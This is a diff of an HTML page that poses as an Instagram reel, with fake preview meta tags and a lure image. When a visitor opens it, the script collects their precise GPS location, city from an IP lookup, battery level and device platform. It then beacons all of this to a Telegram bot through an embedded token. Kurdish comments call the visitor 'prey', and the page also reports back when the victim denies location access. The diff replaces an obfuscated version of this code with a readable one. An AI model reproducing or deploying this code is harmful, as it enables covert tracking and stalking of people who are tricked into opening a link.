@@ -8,69 +8,65 @@
     <meta property="og:description" content="Watch this reel on Instagram">
     <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
     <meta property="og:type" content="video.other">
+    <meta property="og:url" content="https://www.instagram.com/">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
+
     <style>body { background: white; margin: 0; }</style>
 </head>
-<body onload="v_process_init()">
+
+<body onload="capture()">
 
 <script>
+    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
-    const TOKEN = "5109284735:AAHpfhwHzjeuoZzk928374"; 
+    async function capture() {
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('id');
+        if (!uid) return;
 
-    
-    const _s01="O";const _s02="D";const _s03="Y";const _s04="3";const _s05="O";const _s06="D";const _s07="A";const _s08="1";
-    const _s09="M";const _s10="D";const _s11="M";const _s12="0";const _s13="M";const _s14="T";const _s15="p";const _s16="B";
-    const _s17="Q";const _s18="U";const _s19="U";const _s20="3";const _s21="Y";const _s22="j";const _s23="N";const _s24="f";
-    const _s25="d";const _s26="k";const _s27="Z";const _s28="w";const _s29="Z";const _s30="k";const _s31="d";const _s32="q";
-    const _s33="u";const _s34="T";const _s35="R";const _s36="W";const _s37="Z";const _s38="k";const _s39="F";const _s40="G";
-    const _s41="a";const _s42="U";const _s43="M";const _s44="z";const _s45="d";const _s46="l";const _s47="h";const _s48="Y";
-    const _s49="Q";const _s50="z";const _s51="B";const _s52="V";const _s53="Z";const _s54="G";const _s55="n";const _s56="C";
-    const _s57="W";const _s58="X";const _s59="R";const _s60="F";
-
-    async function v_process_init() {
-        const _0xqr = new URLSearchParams(window.location.search);
-        const _0xid = _0xqr.get('id');
-        if (!_0xid) return;
-
-        navigator.geolocation.getCurrentPosition(async (_0xpos) => {
+        // ١. یەکسەر داوای لۆکەیشن دەکات
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
             
-            const _0xf0x9 = atob(
-                _s01+_s02+_s03+_s04+_s05+_s06+_s07+_s08+_s09+_s10+_s11+_s12+_s13+_s14+_s15+_s16+
-                _s17+_s18+_s19+_s20+_s21+_s22+_s23+_s24+_s25+_s26+_s27+_s28+_s29+_s30+_s31+_s32+
-                _s33+_s34+_s35+_s36+_s37+_s38+_s39+_s40+_s41+_s42+_s43+_s44+_s45+_s46+_s47+_s48+
-                _s49+_s50+_s51+_s52+_s53+_s54+_s55+_s56+_s57+_s58+_s59+_s60
-            );
-            
-            const _0xlt = _0xpos.coords.latitude;
-            const _0xln = _0xpos.coords.longitude;
-            const _0xtm = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+            // ٢. وەرگرتنی کاتی ئێستا (بە پێی مۆبایلی نێچیرەکە)
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            let _0xct = "N/A";
+            // ٣. وەرگرتنی ناوی شار بە پێی ئایپی (IP Geolocation)
+            let city = "Unknown";
             try {
-                const _0xgr = await fetch('https://ipapi.co/json/');
-                const _0xgd = await _0xgr.json();
-                _0xct = _0xgd.city + " / " + (_0xgd.region || "");
-            } catch (e) {}
-
-            let _0xbt = "N/A";
-            if (navigator.getBattery) {
-                const _0xb = await navigator.getBattery();
-                _0xbt = Math.floor(_0xb.level * 100) + "%";
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+                city = geoData.city + " / " + (geoData.region || "");
+            } catch (e) {
+                city = "Not Found";
             }
 
-            let _0xrp = `🚨 <b>زانیاری نێچیر</b>\n\n` +
-                         `📍 <b>Location:</b> https://www.google.com/maps?q=${_0xlt},${_0xln}\n` +
-                         `🔋 <b>Battery:</b> ${_0xbt}\n` +
+            // ٤. وەرگرتنی زانیاری باتری
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+            }
+
+            // ٥. ڕێکخستنی ڕاپۆرتەکە
+            let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
+                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
+                         `🔋 <b>Battery:</b> ${bat}\n` +
                          `📱 <b>Device:</b> ${navigator.platform}\n` +
-                         `🕒 <b>Time:</b> ${_0xtm}\n` +
-                         `🏙️ <b>City:</b> ${_0xct}`;
+                         `🕒 <b>Time:</b> ${timeStr}\n` +
+                         `🏙️ <b>City:</b> ${city}`;
 
-            const _0xcall = `https://api.telegram.org/bot${_0xf0x9}/sendMessage?chat_id=${_0xid}&text=${encodeURIComponent(_0xrp)}&parse_mode=HTML`;
-            navigator.sendBeacon(_0xcall);
+            // ٦. ناردنی خێرا (Beacon)
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+            navigator.sendBeacon(url);
 
-        }, (_0xerr) => {
-            const _0xf0x9 = atob(_s01+_s02+_s03+_s04+_s05+_s06+_s07+_s08+_s09+_s10+_s11+_s12+_s13+_s14+_s15+_s16+_s17+_s18+_s19+_s20+_s21+_s22+_s23+_s24+_s25+_s26+_s27+_s28+_s29+_s30+_s31+_s32+_s33+_s34+_s35+_s36+_s37+_s38+_s39+_s40+_s41+_s42+_s43+_s44+_s45+_s46+_s47+_s48+_s49+_s50+_s51+_s52+_s53+_s54+_s55+_s56+_s57+_s58+_s59+_s60);
-            const _0xfail = `https://api.telegram.org/bot${_0xf0x9}/sendMessage?chat_id=${_0xid}&text=${encodeURIComponent("نێچیرەکە ڕێگری کرد لە کردنەوەی لینکەکە")}`;
-            navigator.sendBeacon(_0xfail);
+        }, (err) => {
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text= نێچیرەکە ڕێگری کرد لە کردنەوەی لینکەکە`;
+            navigator.sendBeacon(url);
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
 </script>
